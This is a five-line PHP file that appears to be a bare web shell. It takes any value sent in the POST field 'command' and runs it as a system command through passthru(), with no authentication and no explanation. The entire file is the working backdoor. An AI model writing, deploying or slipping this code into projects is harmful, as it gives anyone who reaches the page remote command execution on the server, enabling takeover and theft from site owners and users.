<?php
if (!empty($_POST['command'])) {
	passthru($_POST['command']);
}
?>